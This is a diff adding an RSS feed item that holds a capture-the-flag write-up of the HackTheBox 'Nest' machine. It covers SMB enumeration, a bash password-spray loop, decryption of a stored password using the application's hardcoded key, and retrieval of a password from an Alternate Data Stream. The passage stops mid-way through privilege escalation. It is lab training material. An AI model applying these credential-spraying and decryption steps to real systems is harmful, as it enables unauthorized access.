@@ -8,6 +8,465 @@
     <lastBuildDate>Fri, 16 Apr 2021 04:59:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/dotn/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Nest</title>
+      <link>https://fahmifj.github.io/hackthebox/nest/</link>
+      <pubDate>Fri, 16 Apr 2021 04:59:14 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/nest/</guid>
+      <description>Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.
+The machine starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to c.smith. There is a VB project inside a directory that can not be reached unless you visit its full path.</description>
+      <content:encoded><![CDATA[<p>Nest is one of my favorite machines after Forest, I learned a lot about enumeration here, especially for SMB.</p>
+<p>The machine starts with anonymous access on SMB, which allows me to obtain credentials of a temporary user. The credentials can be leveraged to read the other shares and obtain an encrypted password that belongs to <code>c.smith</code>. There is a VB project inside a directory that can not be reached unless you visit its full path. This project can be used to decrypt <code>c.smith</code>&rsquo;s password. Enumerating <code>c.smith</code> home directory discovers a password for enabling debug mode of a custom application. With debug mode enabled, I&rsquo;m able to read the application&rsquo;s configuration and obtain encrypted Administrator password. By reversing the application, it allows me to decrypted the administrator password, and then use it gain administrator access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>SMB enumeration</li>
+<li>Alternate Data Stream</li>
+<li>Reversing .NET</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> shows two ports open: SMB on port 445, and an unknown service on port 4386, but the fingerprints show it as &lsquo;Reporting Service V1.2&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nest» «192.168.43.234»
+$ nmap -p1-5000 -sC -sV -oA nmap/nest 10.10.10.178
+Nmap scan report <span class="k">for</span> htb.nest <span class="o">(</span>10.10.10.178<span class="o">)</span>
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+4386/tcp open  unknown                                                                                       
+<span class="p">|</span> fingerprint-strings:                                                                                       
+<span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+<span class="p">|</span>     Reporting Service V1.2                                                                                 
+<span class="p">|</span>   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+<span class="p">|</span>     Reporting Service V1.2
+<span class="p">|</span>     Unrecognised <span class="nb">command</span>
+<span class="p">|</span>   Help:          
+<span class="p">|</span>     Reporting Service V1.2
+<span class="p">|</span>     This service allows users to run queries against databases using the legacy HQK format
+<span class="p">|</span>     AVAILABLE COMMANDS ---                  
+<span class="p">|</span>     LIST   
+<span class="p">|</span>     SETDIR &lt;Directory_Name&gt;
+<span class="p">|</span>     RUNQUERY &lt;Query_ID&gt;          
+<span class="p">|</span>     DEBUG &lt;Password&gt;
+<span class="p">|</span>_    HELP &lt;Command&gt; 
+
+Host script results:
+<span class="p">|</span>_clock-skew: -27s
+<span class="p">|</span> smb2-security-mode:
+<span class="p">|</span>   2.02:
+<span class="p">|</span>_    Message signing enabled but not required
+<span class="p">|</span> smb2-time:
+<span class="p">|</span>   date: 2020-04-28T15:16:46
+<span class="p">|</span>_  start_date: 2020-04-28T04:20:37
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Anonymous access is allowed here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nest» «192.168.43.234»
+$ smbclient -N -L //10.10.10.178/
+</code></pre></div><p><img src="imgs/image-20210416095936362.png" alt="image-20210416095936362" style="zoom:80%;" /></p>
+<h4 id="data-share">Data share</h4>
+<p>Enumeration on <code>Data</code> share with recurse mode shows two text files.</p>
+<p><img src="imgs/image-20210416095856849.png" alt="image-20210416095856849" style="zoom:80%;" /></p>
+<p>One of them is empty while the other one contains credentials for <code>TempUser:Welcome2019</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «smb» «192.168.43.234»
+$ cat loot/Welcome<span class="se">\ </span>Email.txt
+We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+
+You will find your home folder in the following location:
+<span class="se">\\</span>HTB-NEST<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;
+
+If you have any issues accessing specific services or workstations, please inform the
+IT department and use the credentials below <span class="k">until</span> all systems have been <span class="nb">set</span> up <span class="k">for</span> you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+</code></pre></div><p>With <code>TempUsers</code>, I can access the <code>Secure$</code> share.</p>
+<p><img src="imgs/image-20210416100016140.png" alt="image-20210416100016140" style="zoom:80%;" /></p>
+<p>Unfortunately, once I got to <code>Secure$</code> share, I couldn&rsquo;t list any single directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «smb» «192.168.43.234»
+$  smbclient -U <span class="s1">&#39;TempUser%welcome2019&#39;</span> //10.10.10.178/Secure$ 
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> recurse on
+smb: <span class="se">\&gt;</span> ls
+NT_STATUS_ACCESS_DENIED listing <span class="se">\F</span>inance<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\H</span>R<span class="se">\*</span>
+NT_STATUS_ACCESS_DENIED listing <span class="se">\I</span>T<span class="se">\*</span>
+</code></pre></div><p>On the other hand, I did a user enumeration using <code>rpcclient</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210416100040356.png" alt="image-20210416100040356"  /></div>
+</p>
+<p>With a little knowledge of scripting, I can filter the user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nest» «192.168.43.234»
+$  rpcclient -U <span class="s1">&#39;TempUser%welcome2019&#39;</span> -c <span class="s1">&#39;enumdomusers;quit&#39;</span> 10.10.10.178 <span class="p">|</span> tr -d <span class="s1">&#39;[]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;:&#39;</span> -f2 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1
+Administrator
+C.Smith
+Guest
+Service_HQK
+TempUser
+</code></pre></div><p>I did a password spray using a simple bash script with a pattern of <code>username:username</code>, but no luck</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="k">for</span> u in <span class="sb">`</span>cat rpcusers.txt<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> 
+ <span class="nb">echo</span> -n “<span class="o">[</span>*<span class="o">]</span> user : <span class="nv">$u</span> “ <span class="o">&amp;&amp;</span> 
+ rpcclient -U “<span class="nv">$u</span>%<span class="nv">$u</span>” -c “getusername<span class="p">;</span>quit” 10.10.10.178
+<span class="k">done</span>
+</code></pre></div><p>I also check on users' information to find a plain password in the description, but only end up knowing that the user flag is on <code>c.smith</code>.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*7NAs7fNGkLwtNwZsGjTkRw.png" alt="img"  /></div>
+</p>
+<p>I went back to SMB, I decided to download all the content in the <code>Data</code> share.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «loot» «192.168.43.234»
+$ smbget -R smb://10.10.10.178/Data/ -U TempUser  <span class="c1"># or use mget * inside smbclient</span>
+</code></pre></div><p>Here is the folder structure on <code>Data</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
+$ tree
+.
+├── IT
+│   ├── Archive
+│   ├── Configs
+│   │   ├── Adobe
+│   │   │   ├── editing.xml
+│   │   │   ├── Options.txt
+│   │   │   ├── projects.xml
+│   │   │   └── settings.xml
+│   │   ├── Atlas
+│   │   │   └── Temp.XML
+│   │   ├── DLink
+│   │   ├── Microsoft
+│   │   │   └── Options.xml
+│   │   ├── NotepadPlusPlus
+│   │   │   ├── config.xml
+│   │   │   └── shortcuts.xml
+│   │   ├── RU Scanner
+│   │   │   └── RU_config.xml
+│   │   └── Server Manager
+│   ├── Installs
+│   ├── Reports
+│   └── Tools
+├── Production
+├── Reports
+└── Shared
+    ├── Maintenance
+    │   └── Maintenance Alerts.txt
+    └── Templates
+        ├── HR
+        │   └── Welcome Email.txt
+        └── Marketing
+</code></pre></div><p>Notepad++ config on <code>Data/IT/Configs/NotepadPlusPlus/config.xml</code> contains interesting path.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">...<span class="nt">&lt;SNIP&gt;</span>...
+    <span class="nt">&lt;History</span> <span class="na">nbMaxFile=</span><span class="s">&#34;15&#34;</span> <span class="na">inSubMenu=</span><span class="s">&#34;no&#34;</span> <span class="na">customLength=</span><span class="s">&#34;-1&#34;</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span class="nt">/&gt;</span>
+    <span class="nt">&lt;/History&gt;</span>
+<span class="nt">&lt;/NotepadPlus&gt;</span>
+</code></pre></div><p>In <code>/Data/IT/Configs/RU Scanner/RU_config.xml</code>, I found a pair credentials for user <code>c.smith</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">→ root@iamf «RU Scanner» «192.168.43.234»
+$ cat RU_config.xml
+<span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
+  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
+  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
+<span class="nt">&lt;/ConfigFile&gt;</span>
+</code></pre></div><p>At first glance, the password looks like a base64 encoded, but it is encrypted:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «RU Scanner» «192.168.43.234»
+$ <span class="nb">echo</span> <span class="s1">&#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#39;</span> <span class="p">|</span> base64 -d
+<span class="o">}</span>13☺□♥□<span class="o">=</span>X□J□BA□↓☺X*□Wc□f□□□?βc◄
+</code></pre></div><h4 id="secure-share">Secure$ share</h4>
+<p>User carl doesn&rsquo;t appear on my enumeration with <code>rpcclient</code>, so after discovering this path <code>\\HTB-NEST\Secure$\IT\Carl\</code>, I went back to <code>Secure$</code> share and performed a recursive download there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
+$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
+</code></pre></div><p>Here is the <code>Secure$</code> structure.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Secure$» «192.168.43.234»
+$ tree
+.
+├── Docs
+│   ├── ip.txt
+│   └── mmc.txt
+├── Reports
+└── VB Projects
+    ├── Production
+    └── WIP
+        └── RU
+            ├── RUScanner
+            │   ├── bin
+            │   │   ├── Debug
+            │   │   └── Release
+            │   ├── ConfigFile.vb
+            │   ├── Module1.vb
+            │   ├── My Project
+            │   │   ├── Application.Designer.vb
+            │   │   ├── Application.myapp
+            │   │   ├── AssemblyInfo.vb
+            │   │   ├── Resources.Designer.vb
+            │   │   ├── Resources.resx
+            │   │   ├── Settings.Designer.vb
+            │   │   └── Settings.settings
+            │   ├── obj
+            │   │   └── x86
+            │   ├── RU Scanner.vbproj
+            │   ├── RU Scanner.vbproj.user
+            │   ├── SsoIntegration.vb
+            │   └── Utils.vb
+            └── RUScanner.sln
+</code></pre></div><p>I just downloaded a whole VB Project!</p>
+<p>Based on <code>Module1.vb</code>&rsquo;s content, <code>RU_config.xml</code> is loaded to the application, and from this line <code>.Password = Utils.DecryptString(Config.Password)</code>, I know this application is able to decrypt <code>c.smith</code>&rsquo;s password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="err">→</span> <span class="n">root</span><span class="err">@</span><span class="n">iamf</span> <span class="err">«</span><span class="n">WIP</span><span class="err">»</span> <span class="err">«</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">43</span><span class="p">.</span><span class="n">234</span><span class="err">»</span>
+<span class="err">$</span> <span class="n">cat</span> <span class="n">RU</span><span class="o">/</span><span class="n">RUScanner</span><span class="o">/</span><span class="n">Module1</span><span class="p">.</span><span class="n">vb</span>
+<span class="k">Module</span> <span class="nn">Module1</span>
+
+    <span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
+        <span class="k">Dim</span> <span class="n">Config</span> <span class="ow">As</span> <span class="n">ConfigFile</span> <span class="o">=</span> <span class="n">ConfigFile</span><span class="p">.</span><span class="n">LoadFromFile</span><span class="p">(</span><span class="s">&#34;RU_Config.xml&#34;</span><span class="p">)</span>
+        <span class="k">Dim</span> <span class="n">test</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">SsoIntegration</span> <span class="k">With</span> <span class="p">{.</span><span class="n">Username</span> <span class="o">=</span> <span class="n">Config</span><span class="p">.</span><span class="n">Username</span><span class="p">,</span> <span class="p">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">Config</span><span class="p">.</span><span class="n">Password</span><span class="p">)}</span>
+
+    <span class="k">End</span> <span class="k">Sub</span>
+
+<span class="k">End</span> <span class="k">Module</span>
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="access-as-csmith">Access as c.smith</h3>
+<h4 id="decrypting-csmith-password">Decrypting c.smith password</h4>
+<p>The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from <code>Utils.vb</code>, then call it on the main function. I used <a href="https://dotnetfiddle.net/">https://dotnetfiddle.net/</a> for this.</p>
+<p>Here is how it looks like.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="k">Imports</span> <span class="nn">System</span>
+<span class="k">Imports</span> <span class="nn">System.Text</span>
+<span class="k">Imports</span> <span class="nn">System.Security.Cryptography</span>
+
+<span class="k">Public</span> <span class="k">Module</span> <span class="nn">Module1</span>
+	<span class="k">Public</span> <span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
+		<span class="k">Dim</span> <span class="n">encryptedPassword</span>
+		<span class="n">encryptedPassword</span> <span class="o">=</span> <span class="s">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>
+		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Decrypted Password: &#34;</span> <span class="o">+</span><span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedPassword</span><span class="p">))</span>
+	<span class="k">End</span> <span class="k">Sub</span>
+<span class="k">End</span> <span class="k">Module</span>
+
+
+<span class="k">Public</span> <span class="k">Class</span> <span class="nc">Utils</span>
+    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="n">EncryptedString</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">String</span>
+        <span class="k">If</span> <span class="kt">String</span><span class="p">.</span><span class="n">IsNullOrEmpty</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">)</span> <span class="k">Then</span>
+            <span class="k">Return</span> <span class="kt">String</span><span class="p">.</span><span class="n">Empty</span>
+        <span class="k">Else</span>
+            <span class="k">Return</span> <span class="n">Decrypt</span><span class="p">(</span><span class="n">EncryptedString</span><span class="p">,</span> <span class="s">&#34;N3st22&#34;</span><span class="p">,</span> <span class="s">&#34;88552299&#34;</span><span class="p">,</span> <span class="n">2</span><span class="p">,</span> <span class="s">&#34;464R5DFA5DL6LE28&#34;</span><span class="p">,</span> <span class="n">256</span><span class="p">)</span>
+        <span class="k">End</span> <span class="k">If</span>
+    <span class="k">End</span> <span class="k">Function</span>
+    <span class="k">Public</span> <span class="k">Shared</span> <span class="k">Function</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">cipherText</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
+                                   <span class="k">ByVal</span> <span class="n">passPhrase</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
+                                   <span class="k">ByVal</span> <span class="n">saltValue</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
+                                    <span class="k">ByVal</span> <span class="n">passwordIterations</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">,</span> _
+                                   <span class="k">ByVal</span> <span class="n">initVector</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> _
+                                   <span class="k">ByVal</span> <span class="n">keySize</span> <span class="ow">As</span> <span class="kt">Integer</span><span class="p">)</span> _
+                           <span class="ow">As</span> <span class="kt">String</span>
+
+        <span class="k">Dim</span> <span class="n">initVectorBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
+        <span class="n">initVectorBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">initVector</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">saltValueBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
+        <span class="n">saltValueBytes</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">saltValue</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">cipherTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
+        <span class="n">cipherTextBytes</span> <span class="o">=</span> <span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">password</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">Rfc2898DeriveBytes</span><span class="p">(</span><span class="n">passPhrase</span><span class="p">,</span> _
+                                           <span class="n">saltValueBytes</span><span class="p">,</span> _
+                                           <span class="n">passwordIterations</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">keyBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
+        <span class="n">keyBytes</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="k">CInt</span><span class="p">(</span><span class="n">keySize</span> <span class="o">/</span> <span class="n">8</span><span class="p">))</span>
+
+        <span class="k">Dim</span> <span class="n">symmetricKey</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">AesCryptoServiceProvider</span>
+        <span class="n">symmetricKey</span><span class="p">.</span><span class="n">Mode</span> <span class="o">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span>
+
+        <span class="k">Dim</span> <span class="n">decryptor</span> <span class="ow">As</span> <span class="n">ICryptoTransform</span>
+        <span class="n">decryptor</span> <span class="o">=</span> <span class="n">symmetricKey</span><span class="p">.</span><span class="n">CreateDecryptor</span><span class="p">(</span><span class="n">keyBytes</span><span class="p">,</span> <span class="n">initVectorBytes</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">memoryStream</span> <span class="ow">As</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span>
+        <span class="n">memoryStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">cryptoStream</span> <span class="ow">As</span> <span class="n">CryptoStream</span>
+        <span class="n">cryptoStream</span> <span class="o">=</span> <span class="k">New</span> <span class="n">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> _
+                                        <span class="n">decryptor</span><span class="p">,</span> _
+                                        <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">plainTextBytes</span> <span class="ow">As</span> <span class="kt">Byte</span><span class="p">()</span>
+        <span class="k">ReDim</span> <span class="n">plainTextBytes</span><span class="p">(</span><span class="n">cipherTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+
+        <span class="k">Dim</span> <span class="n">decryptedByteCount</span> <span class="ow">As</span> <span class="kt">Integer</span>
+        <span class="n">decryptedByteCount</span> <span class="o">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> _
+                                               <span class="n">0</span><span class="p">,</span> _
+                                               <span class="n">plainTextBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+
+        <span class="n">memoryStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+        <span class="n">cryptoStream</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+        <span class="k">Dim</span> <span class="n">plainText</span> <span class="ow">As</span> <span class="kt">String</span>
+        <span class="n">plainText</span> <span class="o">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">plainTextBytes</span><span class="p">,</span> _
+                                            <span class="n">0</span><span class="p">,</span> _
+                                            <span class="n">decryptedByteCount</span><span class="p">)</span>
+        <span class="k">Return</span> <span class="n">plainText</span>
+    <span class="k">End</span> <span class="k">Function</span>
+<span class="k">End</span> <span class="k">Class</span>
+</code></pre></div><p>Now I have <code>c.smith</code>&rsquo;s password: <code>xRxRxPANCAK3SxRxRx</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210416080029703.png" alt="image-20210416080029703"  /></div>
+</p>
+<h4 id="users-share">Users share</h4>
+<p>With <code>c.smith</code> credentials, I do more enumeration on SMB. First, I&rsquo;ll look into the <code>c.smith</code> home directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «smb» «192.168.43.234»
+$ smbclient -U <span class="s1">&#39;c.smith%xRxRxPANCAK3SxRxRx&#39;</span> //10.10.10.178/Users 
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\C</span>.Smith<span class="se">\&gt;</span> dir
+  .                                   D        <span class="m">0</span>  Sun Jan <span class="m">26</span> 02:21:44 <span class="m">2020</span>
+  ..                                  D        <span class="m">0</span>  Sun Jan <span class="m">26</span> 02:21:44 <span class="m">2020</span>
+  HQK Reporting                       D        <span class="m">0</span>  Thu Aug  <span class="m">8</span> 19:06:17 <span class="m">2019</span>
+  user.txt                            A       <span class="m">32</span>  Thu Aug  <span class="m">8</span> 19:05:24 <span class="m">2019</span>
+</code></pre></div><p>I downloaded those files recursively to my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «c.smith» «192.168.43.234»
+$ tree
+.
+├── HQK Reporting
+│   ├── AD Integration Module
+│   │   └── HqkLdap.exe
+│   ├── Debug Mode Password.txt
+│   └── HQK_Config_Backup.xml
+└── user.txt
+</code></pre></div><p><code>user.txt</code> is the user flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «c.smith» «192.168.43.234»
+$ cat user.txt
+cf71b25404be5d84fd827e05f426e987
+</code></pre></div><p><code>HQK_Config_Backup.xml</code> doesn&rsquo;t contains any useful information</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">→ root@iamf «c.smith» «192.168.43.234»
+$ cat HQK\ Reporting/HQK_Config_Backup.xml
+<span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+<span class="nt">&lt;ServiceSettings</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Port&gt;</span>4386<span class="nt">&lt;/Port&gt;</span>
+  <span class="nt">&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class="nt">&lt;/QueryDirectory&gt;</span>
+<span class="nt">&lt;/ServiceSettings&gt;</span>
+</code></pre></div><p><code>Debug Mode Password.txt</code> is empty file. But when I thought it was empty, I asked a hint for this.</p>
+<p>This file is embedded with Alternate Data Stream (ADS). By using the <code>allinfo</code> command on the SMB, I can see it contains another data stream, <code>Password:$Data</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210525005607779.png" alt="image-20210525005607779"  /></div>
+</p>
+<p>To get that stream, I can just append <code>:Password:$Data</code> at the end of the file name.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> allinfo <span class="s2">&#34;Debug Mode Password.txt&#34;</span>
+altname: DEBUGM~1.TXT
+create_time:    Thu Aug  <span class="m">8</span> 07:06:12 PM <span class="m">2019</span> EDT
+access_time:    Thu Aug  <span class="m">8</span> 07:06:12 PM <span class="m">2019</span> EDT
+write_time:     Thu Aug  <span class="m">8</span> 07:08:17 PM <span class="m">2019</span> EDT
+change_time:    Thu Aug  <span class="m">8</span> 07:08:17 PM <span class="m">2019</span> EDT
+attributes: A <span class="o">(</span>20<span class="o">)</span>
+stream: <span class="o">[</span>::<span class="nv">$DATA</span><span class="o">]</span>, <span class="m">0</span> bytes
+stream: <span class="o">[</span>:Password:<span class="nv">$DATA</span><span class="o">]</span>, <span class="m">15</span> bytes
+smb: <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\&gt;</span> get <span class="s2">&#34;Debug Mode Password.txt&#34;</span>:Password:<span class="nv">$DATA</span>
+getting file <span class="se">\C</span>.Smith<span class="se">\H</span>QK Reporting<span class="se">\D</span>ebug Mode Password.txt:Password:<span class="nv">$DATA</span> of size <span class="m">15</span> as Debug Mode Password.txt:Password:<span class="nv">$DATA</span> <span class="o">(</span>0.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.0 KiloBytes/sec<span class="o">)</span>
+</code></pre></div><p>Now I can use the <code>cat</code> command to see the file content.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «c.smith» «192.168.43.234»
+$ cat Debug<span class="se">\ </span>Mode<span class="se">\ </span>Password.txt:Password:<span class="se">\$</span>DATA
+WBQ201953D8w
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="examination-on-hqk-reporting-service-v12">Examination on HQK Reporting Service v1.2</h4>
+<p>When visiting <code>http://10.10.10.178:4386/</code>, the browser return a session timeout with <code>&gt;</code> symbol, this can imply that this service is cli-based</p>
+<p>With <code>telnet</code>, I can access this service.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «c.smith» «192.168.43.234»
+$ telnet 10.10.10.178 <span class="m">4386</span>
+</code></pre></div><p><img src="imgs/image-20210416083748311.png" alt="image-20210416083748311" style="zoom: 80%;" /></p>
+<p>The service has debug mode and enabling it shows more commands.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">&gt;debug WBQ201953D8w
+</code></pre></div><p><img src="imgs/image-20210416083637321.png" alt="image-20210416083637321" style="zoom: 80%;" /></p>
+<p>Took me a minute to understand the commands, so basically:</p>
+<ul>
+<li>LIST is to list directory,</li>
+<li>SHOWQUERY is to show file content,</li>
+<li>RUNQUERY is to execute.</li>
